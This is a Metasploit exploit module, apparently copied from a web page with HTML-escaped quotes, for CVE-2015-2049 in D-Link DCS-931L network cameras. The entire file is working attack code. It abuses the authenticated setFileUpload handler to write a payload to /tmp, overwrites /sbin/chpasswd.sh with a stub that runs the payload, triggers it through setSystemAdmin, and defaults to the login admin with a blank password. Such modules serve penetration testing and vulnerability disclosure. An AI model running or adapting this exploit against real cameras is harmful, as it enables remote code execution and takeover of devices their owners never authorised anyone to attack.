# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit4 < Msf::Exploit::Remote
  Rank = GreatRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  HttpFingerprint = { :pattern => [ /alphapd/ ] }
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;D-Link DCS-931L File Upload&#039;,
      &#039;Description&#039; => %q{
          This module exploits a file upload vulnerability in D-Link DCS-931L
        network cameras. The setFileUpload functionality allows authenticated
        users to upload files to anywhere on the file system, allowing system
        files to be overwritten, resulting in execution of arbitrary commands.
        This module has been tested successfully on a D-Link DCS-931L with
        firmware versions 1.01_B7 (2013-04-19) and 1.04_B1 (2014-04-21).
        D-Link DCS-930L, DCS-932L, DCS-933L models are also reportedly
        affected, but untested.
      },
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039; =>
        [
          &#039;Mike Baucom&#039;, &#039;Allen Harper&#039;, &#039;J. Rach&#039;, # Initial discovery by Tangible Security
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;Payload&#039; =>
        {
          &#039;Space&#039; => 1024, # File upload
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039; => &#039;linux&#039;,
      &#039;Privileged&#039; => false,
      &#039;Targets&#039; =>
        [
          [ &#039;Linux mipsle Payload&#039;,
            {
              &#039;Arch&#039; => ARCH_MIPSLE,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ]
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;References&#039; =>
        [
          [ &#039;CVE&#039;, &#039;2015-2049&#039; ],
          [ &#039;URL&#039;, &#039;https://tangiblesecurity.com/index.php/announcements/tangible-security-researchers-notified-and-assisted-d-link-with-fixing-critical-device-vulnerabilities&#039; ],
          [ &#039;URL&#039;, &#039;http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10049&#039; ] # Vendor advisory
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 23 2015&#039;))
 
    register_options(
      [
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;Camera username&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [false, &#039;Camera password (default: blank)&#039;, &#039;&#039;])
      ], self.class)
  end
 
  def check
    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(&#039;uploadfile.htm&#039;),
      &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]
    ))
 
    unless res
      vprint_status("#{peer} - The connection timed out.")
      return Exploit::CheckCode::Unknown
    end
 
    if res.code && res.code == 404
      vprint_status("#{peer} - uploadfile.htm does not exist")
      return Exploit::CheckCode::Safe
    elsif res.code && res.code == 401 && res.headers[&#039;WWW-Authenticate&#039;] =~ /realm="DCS\-931L"/
      vprint_error("#{peer} - Authentication failed")
      return Exploit::CheckCode::Detected
    elsif res.code && res.code == 200 && res.body && res.body =~ /Upload File/
      return Exploit::CheckCode::Vulnerable
    end
    Exploit::CheckCode::Safe
  end
 
  def exploit
    payload_path = "/tmp/.#{rand_text_alphanumeric(rand(8) + 5)}"
 
    # upload payload
    res = upload(payload_path, generate_payload_exe)
 
    unless res
      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
    end
 
    if res.code && res.code == 404
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed or setFileUpload functionality does not exist")
    elsif res.code && res.code == 200 && res.body && res.body =~ /File had been uploaded/
      print_good("#{peer} - Payload uploaded successfully")
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Unable to upload payload")
    end
    register_file_for_cleanup(payload_path)
 
    # overwrite /sbin/chpasswd.sh with stub
    res = upload(&#039;/sbin/chpasswd.sh&#039;, "#!/bin/sh\n#{payload_path}&\n")
 
    unless res
      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
    end
 
    if res.code && res.code == 404
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed or setFileUpload functionality does not exist")
    elsif res.code && res.code == 200 && res.body && res.body =~ /File had been uploaded/
      print_good("#{peer} - Stager uploaded successfully")
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Unable to upload stager")
    end
 
    # execute payload using stub
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(&#039;setSystemAdmin&#039;),
      &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]),
      &#039;vars_post&#039; => Hash[{
        &#039;ReplySuccessPage&#039; => &#039;advanced.htm&#039;,
        &#039;ReplyErrorPage&#039; => &#039;errradv.htm&#039;,
        &#039;ConfigSystemAdmin&#039; => &#039;Apply&#039;
      }.to_a.shuffle])
 
    unless res
      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
    end
 
    if res.code && res.code == 401
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    elsif res.code && res.code == 200 && res.body
      print_good("#{peer} - Payload executed successfully")
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Payload execution failed")
    end
  end
 
  #
  # Replace chpasswd.sh with original contents
  #
  def cleanup
    chpasswd = <<-EOF
#!/bin/sh
#
# $Id: chpasswd.sh, v1.00 2009-11-05 andy
#
# usage: chpasswd.sh <user name> [<password>]
#
 
if [ "$1" == "" ]; then
    echo "chpasswd: no user name"
    exit 1
fi
 
echo "$1:$2" > /tmp/tmpchpw
chpasswd < /tmp/tmpchpw
rm -f /tmp/tmpchpw
EOF
    res = upload(&#039;/sbin/chpasswd.sh&#039;, chpasswd)
    if res && res.code && res.code == 200 && res.body && res.body =~ /File had been uploaded/
      vprint_good("#{peer} - Restored /sbin/chpasswd.sh successfully")
    else
      vprint_warning("#{peer} - Could not restore /sbin/chpasswd.sh to default")
    end
  end
 
  #
  # Upload a file to a specified path
  #
  def upload(path, data)
    vprint_status("#{peer} - Writing #{data.length} bytes to #{path}")
 
    boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(rand(10) + 5)}"
    post_data  = "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"ReplySuccessPage\"\r\n"
    post_data << "\r\nreplyuf.htm\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"ReplyErrorPage\"\r\n"
    post_data << "\r\nreplyuf.htm\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"Filename\"\r\n"
    post_data << "\r\n#{path}\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"UploadFile\"; filename=\"#{rand_text_alphanumeric(rand(8) + 5)}\"\r\n"
    post_data << "Content-Type: application/octet-stream\r\n"
    post_data << "\r\n#{data}\r\n"
    post_data << "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"ConfigUploadFile\"\r\n"
    post_data << "\r\nUpload File\r\n"
    post_data << "--#{boundary}\r\n"
 
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(&#039;setFileUpload&#039;),
      &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]),
      &#039;ctype&#039; => "multipart/form-data; boundary=#{boundary}",
      &#039;data&#039; => post_data)
  end
end

